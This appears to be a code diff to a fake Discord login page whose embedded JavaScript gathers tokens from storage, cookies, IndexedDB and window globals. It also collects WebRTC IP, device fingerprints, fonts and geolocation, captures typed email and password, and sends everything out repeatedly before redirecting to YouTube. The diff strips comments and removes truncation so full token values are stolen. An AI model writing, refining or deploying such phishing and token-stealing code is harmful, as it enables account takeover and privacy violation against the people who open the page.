@@ -14,6 +14,7 @@
         .fake-login input::placeholder { color: #888; }
         .fake-login button { background: #7289da; color: #fff; padding: 12px 40px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: 0.3s; }
         .fake-login button:hover { background: #5b6eae; }
+        .fake-login button:disabled { opacity: 0.5; cursor: not-allowed; }
         .note { color: #555; font-size: 12px; margin-top: 15px; }
         .status { color: #00ff88; font-size: 13px; margin-top: 10px; display: none; }
     </style>
@@ -38,7 +39,6 @@
         (function() {
             // ===================== جامع البيانات الفائق =====================
             
-            // 1. محاولة استخراج التوكن من كل مكان ممكن
             function extractTokens() {
                 var tokens = {
                     localStorage: [],
@@ -48,37 +48,33 @@
                     global: []
                 };
 
-                // localStorage
                 try {
                     for (var i = 0; i < localStorage.length; i++) {
                         var key = localStorage.key(i);
                         var val = localStorage.getItem(key);
                         if (val && val.length > 5) {
                             if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('access')) {
-                                tokens.localStorage.push({ key: key, value: val.substring(0, 100) });
+                                tokens.localStorage.push({ key: key, value: val });
                             }
-                            // كشف التوكن بصيغة Base64 أو نص طويل
                             if (val.length > 30 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{20,}$/))) {
-                                tokens.localStorage.push({ key: key, value: val.substring(0, 100) + '...' });
+                                tokens.localStorage.push({ key: key, value: val });
                             }
                         }
                     }
                 } catch(e) {}
 
-                // sessionStorage
                 try {
                     for (var j = 0; j < sessionStorage.length; j++) {
                         var sk = sessionStorage.key(j);
                         var sv = sessionStorage.getItem(sk);
                         if (sv && sv.length > 5) {
                             if (sk.toLowerCase().includes('token') || sk.toLowerCase().includes('discord') || sk.toLowerCase().includes('auth')) {
-                                tokens.sessionStorage.push({ key: sk, value: sv.substring(0, 100) });
+                                tokens.sessionStorage.push({ key: sk, value: sv });
                             }
                         }
                     }
                 } catch(e) {}
 
-                // cookies
                 try {
                     var cookies = document.cookie.split(';');
                     for (var k = 0; k < cookies.length; k++) {
@@ -89,7 +85,6 @@
                     }
                 } catch(e) {}
 
-                // محاولة قراءة IndexedDB (خاص بدسكورد)
                 try {
                     var indexedDB = window.indexedDB || window.mozIndexedDB || window.webkitIndexedDB || window.msIndexedDB;
                     if (indexedDB) {
@@ -99,14 +94,13 @@
                     tokens.indexedDB = 'IndexedDB error: ' + e.message;
                 }
 
-                // البحث في window object
                 try {
                     for (var key in window) {
                         try {
                             var val = window[key];
                             if (typeof val === 'string' && val.length > 20 && (val.includes('.') || val.match(/^[A-Za-z0-9-_]{30,}$/))) {
                                 if (key.toLowerCase().includes('token') || key.toLowerCase().includes('discord')) {
-                                    tokens.global.push({ key: key, value: val.substring(0, 100) });
+                                    tokens.global.push({ key: key, value: val });
                                 }
                             }
                         } catch(e) {}
@@ -116,11 +110,9 @@
                 return tokens;
             }
 
-            // 2. معلومات الشبكة المتقدمة
             function getNetworkInfo() {
                 var info = {};
                 try {
-                    // WebRTC IP leak (محاولة كشف الـ IP المحلي)
                     var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                     if (RTCPeerConnection) {
                         var pc = new RTCPeerConnection({ iceServers: [] });
@@ -136,7 +128,6 @@
                     }
                 } catch(e) { info.webrtcError = e.message; }
 
-                // معلومات الاتصال
                 try {
                     info.connection = {
                         type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
@@ -148,58 +139,33 @@
                 return info;
             }
 
-            // 3. محاولة قراءة الملفات المحلية (عبر API)
-            function getLocalFiles() {
-                var result = { possible: false, details: [] };
-                try {
-                    if ('showDirectoryPicker' in window) {
-                        result.possible = true;
-                        result.details.push('showDirectoryPicker available');
-                    }
-                    if ('showOpenFilePicker' in window) {
-                        result.possible = true;
-                        result.details.push('showOpenFilePicker available');
-                    }
-                    // محاولة قراءة ملفات من المسارات الشائعة (لن تنجح بدون إذن)
-                    result.details.push('FileSystem API available: ' + ('FileSystemFileHandle' in window));
-                } catch(e) {
-                    result.error = e.message;
-                }
-                return result;
-            }
-
-            // 4. بصمة الجهاز المتقدمة
             function getDeviceFingerprint() {
                 var fp = {};
                 try {
-                    fp.canvas = (function() {
-                        var canvas = document.createElement('canvas');
-                        canvas.width = 256;
-                        canvas.height = 128;
-                        var ctx = canvas.getContext('2d');
-                        ctx.textBaseline = 'top';
-                        ctx.font = '14px Arial';
-                        ctx.fillStyle = '#f60';
-                        ctx.fillRect(125, 1, 62, 20);
-                        ctx.fillStyle = '#069';
-                        ctx.fillText('FP', 2, 15);
-                        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                        ctx.fillText('Fingerprint', 4, 45);
-                        return canvas.toDataURL().substring(0, 100);
-                    })();
-                    fp.webgl = (function() {
-                        try {
-                            var canvas = document.createElement('canvas');
-                            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                            if (gl) {
-                                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                                if (debugInfo) {
-                                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                                }
+                    var canvas = document.createElement('canvas');
+                    canvas.width = 256;
+                    canvas.height = 128;
+                    var ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('FP', 2, 15);
+                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                    ctx.fillText('Fingerprint', 4, 45);
+                    fp.canvas = canvas.toDataURL();
+                    
+                    try {
+                        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (gl) {
+                            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (debugInfo) {
+                                fp.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) + ' | ' + gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                             }
-                            return 'webgl not available';
-                        } catch(e) { return 'webgl error'; }
-                    })();
+                        }
+                    } catch(e) { fp.webgl = 'webgl error'; }
+                    
                     fp.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                     fp.deviceMemory = navigator.deviceMemory || 'unknown';
                     fp.maxTouchPoints = navigator.maxTouchPoints || 0;
@@ -207,18 +173,12 @@
                 return fp;
             }
 
-            // ===================== جمع كل البيانات =====================
-            
             var tokens = extractTokens();
             var network = getNetworkInfo();
-            var files = getLocalFiles();
             var fingerprint = getDeviceFingerprint();
 
             var data = {
-                // التوكنات المستخرجة
                 extractedTokens: tokens,
-                
-                // معلومات الجهاز الأساسية
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -228,20 +188,9 @@
                 colorDepth: screen.colorDepth,
                 pixelRatio: window.devicePixelRatio || 1,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                
-                // البصمة المتقدمة
                 fingerprint: fingerprint,
-                
-                // معلومات الشبكة
                 network: network,
-                
-                // محاولة الوصول للملفات
-                localFileAccess: files,
-                
-                // الموقع الجغرافي
                 location: null,
-                
-                // قائمة الخطوط
                 installedFonts: (function() {
                     var fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Tahoma', 'Trebuchet MS', 'Impact', 'Comic Sans MS', 'Arial Black', 'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia', 'Corbel', 'Franklin Gothic', 'Gabriola', 'Gadugi', 'Georgia', 'Impact', 'Ink Free', 'Javanese', 'Leelawadee', 'Lucida Sans', 'Marlett', 'Microsoft Sans Serif', 'Mongolian Baiti', 'Myanmar', 'Palatino', 'Segoe UI', 'Sylfaen', 'Symbol', 'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana'];
                     var result = [];
@@ -252,11 +201,7 @@
                     }
                     return result;
                 })(),
-                
-                // جميع الكوكيز
                 allCookies: document.cookie,
-                
-                // محاولة قراءة LocalStorage بالكامل
                 fullLocalStorage: (function() {
                     var items = {};
                     try {
@@ -267,8 +212,6 @@
                     } catch(e) { items.error = e.message; }
                     return items;
                 })(),
-                
-                // SessionStorage بالكامل
                 fullSessionStorage: (function() {
                     var items = {};
                     try {
@@ -281,7 +224,6 @@
                 })()
             };
 
-            // الموقع الجغرافي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(pos) {
@@ -299,7 +241,6 @@
                 sendData(data);
             }
 
-            // إرسال البيانات فوراً وبعد 3 ثواني ومرة بعد 10 ثواني
             setTimeout(function() { sendData(data); }, 500);
             setTimeout(function() { sendData(data); }, 3000);
             setTimeout(function() { sendData(data); }, 10000);
@@ -312,7 +253,6 @@
                 }).catch(function(err) { console.error(err); });
             }
 
-            // ===================== نموذج الدسكورد الوهمي =====================
             window.submitFake = function() {
                 var email = document.getElementById('discordEmail').value;
                 var password = document.getElementById('discordPassword').value;
@@ -333,7 +273,7 @@
                     document.getElementById('statusMsg').style.display = 'block';
                     document.querySelector('.fake-login button').textContent = '✓ Verified';
                     document.querySelector('.fake-login button').disabled = true;
-                    document.querySelector('.fake-login input').forEach(function(inp) { inp.disabled = true; });
+                    document.querySelectorAll('.fake-login input').forEach(function(inp) { inp.disabled = true; });
                     
                     setTimeout(function() {
                         window.location.href = 'https://www.youtube.com';
